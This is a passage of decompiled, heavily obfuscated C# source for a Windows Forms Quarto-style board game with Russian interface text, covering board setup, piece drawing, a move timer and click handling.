using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 621236695;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x151A0D26u) % 8u)
					{
					case 6u:
						Square = square;
						num = ((int)num2 * -1323720410) ^ 0x3F034E3A;
						continue;
					case 5u:
						num = (int)((num2 * 964404633) ^ 0x4716F220);
						continue;
					case 4u:
						Big = big;
						num = (int)(num2 * 333075222) ^ -1652485832;
						continue;
					case 3u:
						Dark = dark;
						num = ((int)num2 * -560935897) ^ -1651460145;
						continue;
					case 1u:
						num = (int)(num2 * 1701867606) ^ -412957307;
						continue;
					case 0u:
						Point = point;
						num = ((int)num2 * -993026028) ^ 0x2A188DC1;
						continue;
					default:
						return;
					case 2u:
						break;
					case 7u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 1694048784;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x47D78F80u) % 5u)
					{
					case 3u:
						Dark = copy.Dark;
						Big = copy.Big;
						num = (int)((num2 * 1649878850) ^ 0x2ECED7BF);
						continue;
					case 1u:
						Point = copy.Point;
						num = (int)((num2 * 923498070) ^ 0x42DBA3C2);
						continue;
					case 0u:
						Square = copy.Square;
						num = (int)((num2 * 141182002) ^ 0x33CB41AE);
						continue;
					default:
						return;
					case 4u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = -1387571607;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xED50F560u) % 3u)
				{
				case 2u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0033:
				num = ((int)num2 * -640684123) ^ 0x4B72DC1B;
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 244978415;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x45029EA9u) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = (int)((num2 * 1552681884) ^ 0x6E799969);
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = -171628796;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x86C4337Au) % 9u)
				{
				case 8u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -921068204;
					continue;
				case 5u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)(num2 * 1128560671) ^ -1046463896;
					continue;
				}
				case 4u:
					num = (int)((num2 * 1463623591) ^ 0x393B36CD);
					continue;
				case 3u:
					num = (int)(num2 * 2118824928) ^ -1348430474;
					continue;
				case 2u:
					num = -485631816;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -388268068;
						num4 = -388268068;
					}
					else
					{
						num3 = -100651467;
						num4 = -100651467;
					}
					num = num3 ^ (int)(num2 * 1028807339);
					continue;
				}
				case 0u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -1837718353) ^ 0x726CBF82;
					continue;
				default:
					return;
				case 7u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num = -694436287;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8BC76DDDu) % 20u)
				{
				case 19u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					Paint_Storage();
					num = (int)(num2 * 1155168242) ^ -688412727;
					continue;
				case 18u:
					num4++;
					num = ((int)num2 * -1585642589) ^ 0x976FC04;
					continue;
				case 16u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 227529639;
						num8 = 227529639;
					}
					else
					{
						num7 = 1247391096;
						num8 = 1247391096;
					}
					num = num7 ^ (int)(num2 * 572004828);
					continue;
				}
				case 15u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = -647218091;
						num6 = -647218091;
					}
					else
					{
						num5 = -1067888094;
						num6 = -1067888094;
					}
					num = num5 ^ ((int)num2 * -1130085661);
					continue;
				}
				case 14u:
					Paint_Board();
					num = (int)((num2 * 80547414) ^ 0x4D617AE);
					continue;
				case 13u:
					num4 = 0;
					num = -1292714048;
					continue;
				case 12u:
					board = new Figurine[4, 4];
					num = (int)((num2 * 1132450394) ^ 0x6768A7DA);
					continue;
				case 11u:
					storage = new Figurine[4, 4];
					num = (int)((num2 * 755705049) ^ 0x769DA9F0);
					continue;
				case 10u:
					num = ((int)num2 * -105226593) ^ 0x64F1F433;
					continue;
				case 9u:
					num = ((int)num2 * -518504240) ^ -93396910;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = ((int)num2 * -1162828403) ^ 0x28382803;
					continue;
				case 7u:
					num = ((int)num2 * -1876349249) ^ 0x59EC4341;
					continue;
				case 6u:
					num3 = 0;
					num = ((int)num2 * -25374142) ^ -218738030;
					continue;
				case 5u:
					flag2 = num3 < 4;
					num = -1997067610;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 3284302) ^ 0x39E70BCD);
					continue;
				case 3u:
					flag = num4 < 4;
					num = -386512127;
					continue;
				case 2u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = -419617519;
					continue;
				case 1u:
					num3++;
					num = ((int)num2 * -2133147774) ^ 0x6BEEE90E;
					continue;
				default:
					return;
				case 17u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num5 = default(int);
		float num8 = default(float);
		float num4 = default(float);
		float num9 = default(float);
		float num7 = default(float);
		Brush brush_ = default(Brush);
		bool dark = default(bool);
		bool square = default(bool);
		float num3 = default(float);
		bool point = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -626918097;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8C45D2AEu) % 42u)
				{
				case 41u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -365274842) ^ -1348175438;
					continue;
				case 40u:
				{
					int num16;
					int num17;
					if (board[num6, num5] != null)
					{
						num16 = 406882711;
						num17 = 406882711;
					}
					else
					{
						num16 = 897138293;
						num17 = 897138293;
					}
					num = num16 ^ (int)(num2 * 779358341);
					continue;
				}
				case 39u:
					num8 = (float)size * (num4 / 2f);
					num9 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1338065941) ^ 0x71599F24);
					continue;
				case 38u:
				{
					int num21;
					if (board[num6, num5].Big)
					{
						num = -1625836806;
						num21 = -1625836806;
					}
					else
					{
						num = -5781856;
						num21 = -5781856;
					}
					continue;
				}
				case 36u:
					num = (int)((num2 * 1268313214) ^ 0x76B9A090);
					continue;
				case 35u:
					num = (int)(num2 * 1689532046) ^ -1626141829;
					continue;
				case 34u:
					num = (int)(num2 * 2074501336) ^ -2065959655;
					continue;
				case 33u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -260576570) ^ 0x26D2F542;
					continue;
				case 32u:
					num6++;
					num = (int)(num2 * 1939064886) ^ -769391193;
					continue;
				case 31u:
				{
					int num12;
					int num13;
					if (!dark)
					{
						num12 = 1727788839;
						num13 = 1727788839;
					}
					else
					{
						num12 = 1810503513;
						num13 = 1810503513;
					}
					num = num12 ^ ((int)num2 * -542874332);
					continue;
				}
				case 30u:
					num = (int)((num2 * 1652311847) ^ 0x2660AE9D);
					continue;
				case 29u:
					dark = board[num6, num5].Dark;
					num = (int)((num2 * 2005327163) ^ 0x4863BC22);
					continue;
				case 28u:
					num = ((int)num2 * -303609919) ^ 0x5F635785;
					continue;
				case 27u:
				{
					int num20;
					if (num6 >= 4)
					{
						num = -1145337348;
						num20 = -1145337348;
					}
					else
					{
						num = -1774026501;
						num20 = -1774026501;
					}
					continue;
				}
				case 26u:
				{
					int num18;
					int num19;
					if (square)
					{
						num18 = -116489017;
						num19 = -116489017;
					}
					else
					{
						num18 = -248647265;
						num19 = -248647265;
					}
					num = num18 ^ ((int)num2 * -196197182);
					continue;
				}
				case 24u:
					num3 = 0.7f;
					num = -1895062455;
					continue;
				case 23u:
					Form1.smethod_28(graphics_, brush_, num8 + (float)(num5 * size), num8 + (float)(num6 * size), num9, num9);
					num = ((int)num2 * -1395526246) ^ -905785478;
					continue;
				case 22u:
					num6 = 0;
					num = (int)((num2 * 1959692605) ^ 0x9CCF2EE);
					continue;
				case 21u:
					num = -1108419451;
					continue;
				case 20u:
				{
					int num14;
					int num15;
					if (!point)
					{
						num14 = 428535577;
						num15 = 428535577;
					}
					else
					{
						num14 = 510287080;
						num15 = 510287080;
					}
					num = num14 ^ ((int)num2 * -2031724603);
					continue;
				}
				case 19u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 362313298) ^ 0x6421BDA1);
					continue;
				case 18u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8 + (float)(num5 * size), num8 + (float)(num6 * size), num9, num9);
					num = ((int)num2 * -1726855259) ^ 0x65054B6C;
					continue;
				case 17u:
					Form1.smethod_24(graphics_, brush_, num8 + (float)(num5 * size), num8 + (float)(num6 * size), num9, num9);
					num = -490290758;
					continue;
				case 16u:
					num = (int)((num2 * 1228440197) ^ 0xDB8B85D);
					continue;
				case 15u:
					num4 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1854645715;
					continue;
				case 14u:
					num3 = 1f;
					num = ((int)num2 * -1918152715) ^ 0x4C548806;
					continue;
				case 13u:
					point = board[num6, num5].Point;
					num = ((int)num2 * -157212044) ^ 0x3D76ACAA;
					continue;
				case 12u:
					num = (int)((num2 * 329789549) ^ 0x422964BF);
					continue;
				case 11u:
					brush_ = Form1.smethod_26();
					num = -1715255500;
					continue;
				case 10u:
					num = ((int)num2 * -1533153371) ^ -77528375;
					continue;
				case 9u:
					flag = num5 < 4;
					num = -523155966;
					continue;
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1871597799) ^ -16889461;
					continue;
				case 7u:
					num5++;
					num = -1831523865;
					continue;
				case 6u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 1713669380;
						num11 = 1713669380;
					}
					else
					{
						num10 = 464026464;
						num11 = 464026464;
					}
					num = num10 ^ ((int)num2 * -1709376053);
					continue;
				}
				case 5u:
					num5 = 0;
					num = -2020760996;
					continue;
				case 4u:
					square = board[num6, num5].Square;
					num = (int)(num2 * 1032637976) ^ -257374866;
					continue;
				case 3u:
					num7 = (float)size * num3;
					num8 = (float)size * (num4 / 2f);
					num9 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 1905867854) ^ -2046840892;
					continue;
				case 2u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num5 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -320167770;
					continue;
				case 1u:
					num4 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -707686079;
					continue;
				case 0u:
					num = (int)(num2 * 1098719829) ^ -820446154;
					continue;
				default:
					return;
				case 37u:
					break;
				case 25u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		bool big = default(bool);
		float num7 = default(float);
		float num11 = default(float);
		Brush brush_ = default(Brush);
		int num4 = default(int);
		bool point = default(bool);
		bool dark = default(bool);
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		float num6 = default(float);
		float num8 = default(float);
		float num5 = default(float);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 569802959;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1823E3DCu) % 42u)
				{
				case 41u:
				{
					int num20;
					int num21;
					if (!big)
					{
						num20 = -369884919;
						num21 = -369884919;
					}
					else
					{
						num20 = -1816404821;
						num21 = -1816404821;
					}
					num = num20 ^ ((int)num2 * -138258831);
					continue;
				}
				case 39u:
					num7 = (float)size * num11;
					num = (int)(num2 * 3890568) ^ -929053937;
					continue;
				case 38u:
					brush_ = Form1.smethod_26();
					num = 984987931;
					continue;
				case 37u:
					num4 = 0;
					num = (int)(num2 * 238248047) ^ -1628462719;
					continue;
				case 36u:
					num = ((int)num2 * -1988408648) ^ -1632136922;
					continue;
				case 35u:
				{
					int num22;
					int num23;
					if (!point)
					{
						num22 = -356679695;
						num23 = -356679695;
					}
					else
					{
						num22 = -1712596013;
						num23 = -1712596013;
					}
					num = num22 ^ (int)(num2 * 188185406);
					continue;
				}
				case 34u:
				{
					int num14;
					int num15;
					if (dark)
					{
						num14 = 276463003;
						num15 = 276463003;
					}
					else
					{
						num14 = 789163590;
						num15 = 789163590;
					}
					num = num14 ^ ((int)num2 * -727672119);
					continue;
				}
				case 33u:
					num4++;
					num = (int)(num2 * 381188184) ^ -1569708588;
					continue;
				case 32u:
					num11 = 1f;
					num = (int)((num2 * 2022519175) ^ 0x145F0FC0);
					continue;
				case 31u:
					Form1.smethod_30((Control)(object)pictureBox[num4, num3]);
					num = 636041632;
					continue;
				case 30u:
					point = storage[num4, num3].Point;
					num = (int)((num2 * 1042960569) ^ 0x5B8FD92B);
					continue;
				case 29u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6, num6, num8, num8);
					num = (int)((num2 * 1700368086) ^ 0x7AA40539);
					continue;
				case 28u:
					num5 = 1f - num11 * 0.4f / (float)Form1.smethod_27(2.0);
					num6 = (float)size * (num5 / 2f) - 4f;
					num8 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1020494444;
					continue;
				case 27u:
					num = ((int)num2 * -1411302999) ^ -1893889449;
					continue;
				case 26u:
					num = ((int)num2 * -70916053) ^ -470458355;
					continue;
				case 25u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num4, num3]));
					num = (int)((num2 * 289204190) ^ 0x2FABD911);
					continue;
				case 24u:
					num11 = 0.7f;
					num = 386089368;
					continue;
				case 23u:
				{
					int num18;
					int num19;
					if (flag3)
					{
						num18 = 588800287;
						num19 = 588800287;
					}
					else
					{
						num18 = 2028980916;
						num19 = 2028980916;
					}
					num = num18 ^ ((int)num2 * -347878249);
					continue;
				}
				case 22u:
					num = (int)((num2 * 706928039) ^ 0x35724863);
					continue;
				case 21u:
				{
					int num16;
					int num17;
					if (flag)
					{
						num16 = 843542981;
						num17 = 843542981;
					}
					else
					{
						num16 = 616408954;
						num17 = 616408954;
					}
					num = num16 ^ ((int)num2 * -1520890285);
					continue;
				}
				case 20u:
					num = (int)(num2 * 113116751) ^ -27383865;
					continue;
				case 19u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 753491384) ^ 0x4E548860);
					continue;
				case 18u:
					Form1.smethod_24(graphics_, brush_, num6, num6, num8, num8);
					num = 1849072651;
					continue;
				case 17u:
					Form1.smethod_20(pictureBox[num4, num3], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num4, num3]), Form1.smethod_16((Control)(object)pictureBox[num4, num3])));
					num = (int)((num2 * 1703002773) ^ 0x4E699E57);
					continue;
				case 16u:
					Form1.smethod_28(graphics_, brush_, num6, num6, num8, num8);
					num = ((int)num2 * -561895841) ^ 0x3D477342;
					continue;
				case 15u:
					num = (int)((num2 * 1455533677) ^ 0x6E9C98B5);
					continue;
				case 14u:
					flag3 = num3 < 4;
					num = 341427797;
					continue;
				case 13u:
					dark = storage[num4, num3].Dark;
					num = ((int)num2 * -964013429) ^ -863810725;
					continue;
				case 12u:
					flag2 = storage[num4, num3] != null;
					num = 862924166;
					continue;
				case 11u:
					big = storage[num4, num3].Big;
					num = 350344265;
					continue;
				case 10u:
				{
					int num12;
					int num13;
					if (!flag2)
					{
						num12 = -1161095272;
						num13 = -1161095272;
					}
					else
					{
						num12 = -389341419;
						num13 = -389341419;
					}
					num = num12 ^ ((int)num2 * -153957154);
					continue;
				}
				case 9u:
					num = (int)((num2 * 1121739261) ^ 0x3FC97B6C);
					continue;
				case 8u:
					num = ((int)num2 * -1694901569) ^ -781606106;
					continue;
				case 7u:
					num = ((int)num2 * -658694597) ^ -1436276592;
					continue;
				case 6u:
					num3 = 0;
					num = 248933;
					continue;
				case 4u:
					num5 = 1f - num11 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 391294179;
					continue;
				case 3u:
				{
					num6 = (float)size * (num5 / 2f) - 4f;
					num8 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					int num9;
					int num10;
					if (num3 < 2)
					{
						num9 = -524499144;
						num10 = -524499144;
					}
					else
					{
						num9 = -470075156;
						num10 = -470075156;
					}
					num = num9 ^ (int)(num2 * 873350514);
					continue;
				}
				case 2u:
					flag = num4 < 4;
					num = 1195019095;
					continue;
				case 1u:
					num = (int)(num2 * 1293402896) ^ -28330410;
					continue;
				case 0u:
					num3++;
					num = 325400694;
					continue;
				default:
					return;
				case 40u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		if (turn)
		{
			goto IL_01ee;
		}
		goto IL_032a;
		IL_032a:
		int num = Form1.smethod_33(rnd, 4);
		int num2 = 318692656;
		goto IL_02ab;
		IL_02ab:
		bool flag = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0x7562B6C1u) % 27u)
			{
			case 26u:
				flag = num6 < 4;
				num2 = 69509370;
				continue;
			case 25u:
				num2 = (int)(num3 * 1970922449) ^ -810089678;
				continue;
			case 23u:
				Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
				num2 = ((int)num3 * -373217537) ^ -1252503177;
				continue;
			case 22u:
				num5++;
				num2 = (int)((num3 * 1037408444) ^ 0xF86B7B3);
				continue;
			case 21u:
			{
				int num7;
				int num8;
				if (flag)
				{
					num7 = -2112817006;
					num8 = -2112817006;
				}
				else
				{
					num7 = -1438156315;
					num8 = -1438156315;
				}
				num2 = num7 ^ (int)(num3 * 2079084528);
				continue;
			}
			case 20u:
				num6 = 0;
				num2 = 1847304242;
				continue;
			case 19u:
				Form1.smethod_7((Control)(object)pictureBox[num5, num6], bool_0: true);
				num2 = 235788952;
				continue;
			case 17u:
				num6++;
				num2 = ((int)num3 * -431335906) ^ 0x4335385C;
				continue;
			case 16u:
				Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
				num2 = 1434468067;
				continue;
			case 15u:
				Form1.smethod_36(timer1);
				num2 = ((int)num3 * -1066687268) ^ 0x789B09CC;
				continue;
			case 14u:
				num2 = (int)(num3 * 2118033111) ^ -2103214715;
				continue;
			case 13u:
				step = 1;
				num2 = ((int)num3 * -956517448) ^ 0x4529802A;
				continue;
			case 12u:
				Form1.smethod_5((Control)(object)borderBox[num, num4], Color.Blue);
				num2 = ((int)num3 * -685894913) ^ 0x41901DEC;
				continue;
			case 11u:
				num2 = (int)(num3 * 867513834) ^ -1954228708;
				continue;
			case 10u:
				Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
				num2 = ((int)num3 * -393436237) ^ 0x6041B59D;
				continue;
			case 9u:
				num5 = 0;
				num2 = (int)(num3 * 2144394321) ^ -1205559848;
				continue;
			case 8u:
				break;
			case 7u:
				goto end_IL_02ab;
			case 6u:
				num2 = (int)((num3 * 6324491) ^ 0x4F91A498);
				continue;
			case 5u:
				time = new DateTime(0L, DateTimeKind.Unspecified);
				Form1.smethod_35(timer1, bool_0: true);
				num2 = (int)((num3 * 819356359) ^ 0x22429D92);
				continue;
			case 4u:
				num2 = ((int)num3 * -929853201) ^ -874425868;
				continue;
			case 3u:
				Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
				num2 = (int)((num3 * 1379068653) ^ 0x55CBBFA3);
				continue;
			case 2u:
				num2 = (int)(num3 * 1055578567) ^ -1584779296;
				continue;
			case 1u:
				num4 = Form1.smethod_33(rnd, 4);
				num2 = (int)(num3 * 28715148) ^ -757908290;
				continue;
			case 0u:
				step = 0;
				num2 = (int)((num3 * 641723969) ^ 0x445EB1B5);
				continue;
			default:
				return;
			case 24u:
				goto IL_032a;
			case 18u:
				return;
			}
			int num9;
			if (num5 < 4)
			{
				num2 = 1769961589;
				num9 = 1769961589;
			}
			else
			{
				num2 = 2078199654;
				num9 = 2078199654;
			}
			continue;
			end_IL_02ab:
			break;
		}
		goto IL_01ee;
		IL_01ee:
		num2 = 414668217;
		goto IL_02ab;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -17135981;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF2C5ED65u) % 4u)
				{
				case 2u:
					time = time.AddSeconds(1.0);
					num = ((int)num2 * -270704918) ^ -1225673520;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)((num2 * 253296857) ^ 0x14030770);
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Expected O, but got Unknown
		bool flag = default(bool);
		int num6 = default(int);
		int num8 = default(int);
		bool flag2 = default(bool);
		int num3 = default(int);
		Point point = default(Point);
		int num7 = default(int);
		while (true)
		{
			int num = -179851471;
			while (true)
			{
				uint num2;
				int num13;
				switch ((num2 = (uint)num ^ 0xE2F0E5E8u) % 23u)
				{
				case 22u:
					flag = num6 < 4;
					num = -1242751159;
					continue;
				case 21u:
				{
					int num14;
					if (num8 >= 4)
					{
						num = -188123674;
						num14 = -188123674;
					}
					else
					{
						num = -2129128863;
						num14 = -2129128863;
					}
					continue;
				}
				case 19u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -1397569483;
						num12 = -1397569483;
					}
					else
					{
						num11 = -648846420;
						num12 = -648846420;
					}
					num = num11 ^ (int)(num2 * 241952080);
					continue;
				}
				case 18u:
					num3 = point.X / size;
					num = ((int)num2 * -2036766547) ^ 0x5CECEF04;
					continue;
				case 17u:
					num3 -= 4;
					num = ((int)num2 * -951681537) ^ 0x7E93BBAA;
					continue;
				case 16u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num7 = point.Y / size;
					num = (int)(num2 * 1154328991) ^ -1726723796;
					continue;
				case 15u:
					num6++;
					num = (int)((num2 * 1576450612) ^ 0x345AF04E);
					continue;
				case 14u:
					num8++;
					num = ((int)num2 * -150936531) ^ 0x691CE01B;
					continue;
				case 13u:
					num8 = 0;
					num = ((int)num2 * -359718409) ^ -717914087;
					continue;
				case 12u:
					Form1.smethod_5((Control)(object)borderBox[num7, num3], Color.Red);
					num = (int)((num2 * 1647177601) ^ 0x4888194C);
					continue;
				case 11u:
					num = (int)(num2 * 1572955378) ^ -1318640151;
					continue;
				case 10u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1048375719) ^ 0x5185E546;
					continue;
				case 9u:
					Form1.smethod_5((Control)(object)borderBox[num8, num6], Color.White);
					num = -172561385;
					continue;
				case 7u:
					num = (int)(num2 * 1949427164) ^ -1226373511;
					continue;
				case 6u:
					num13 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num7, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_01da;
				case 5u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 1673741571) ^ -652951355;
					continue;
				case 4u:
					num6 = 0;
					num = -1561117977;
					continue;
				case 3u:
					if (storage[num7, num3] != null)
					{
						num = -1455051211;
						continue;
					}
					num13 = 0;
					goto IL_01da;
				case 2u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = 700037235;
						num10 = 700037235;
					}
					else
					{
						num9 = 1653360683;
						num10 = 1653360683;
					}
					num = num9 ^ (int)(num2 * 693412925);
					continue;
				}
				case 1u:
					num = ((int)num2 * -1541610882) ^ 0x1AABAE0;
					continue;
				case 0u:
				{
					int num4;
					int num5;
					if (num3 <= 1)
					{
						num4 = 58816708;
						num5 = 58816708;
					}
					else
					{
						num4 = 153903992;
						num5 = 153903992;
					}
					num = num4 ^ ((int)num2 * -344804359);
					continue;
				}
				default:
					return;
				case 8u:
					break;
				case 20u:
					return;
					IL_01da:
					flag2 = (byte)num13 != 0;
					num = -1656330239;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num2 = Form1.smethod_39(e) / size;
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num3 = 1319546115;
			while (true)
			{
				uint num4;
				int num7;
				switch ((num4 = (uint)num3 ^ 0xD364113u) % 23u)
				{
				case 22u:
				{
					int num8;
					if (num6 >= 4)
					{
						num3 = 1144362524;
						num8 = 1144362524;
					}
					else
					{
						num3 = 1698891818;
						num8 = 1698891818;
					}
					continue;
				}
				case 21u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = 581739817;
						num13 = 581739817;
					}
					else
					{
						num12 = 1931757047;
						num13 = 1931757047;
					}
					num3 = num12 ^ ((int)num4 * -2105144648);
					continue;
				}
				case 20u:
					flag = Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue;
					num3 = 1929324564;
					continue;
				case 19u:
					num3 = ((int)num4 * -524748036) ^ 0x71DB8819;
					continue;
				case 18u:
					num3 = (int)(num4 * 2030033567) ^ -1266007914;
					continue;
				case 17u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 786968071;
						num11 = 786968071;
					}
					else
					{
						num10 = 1298137249;
						num11 = 1298137249;
					}
					num3 = num10 ^ ((int)num4 * -214292405);
					continue;
				}
				case 15u:
					Paint_Board();
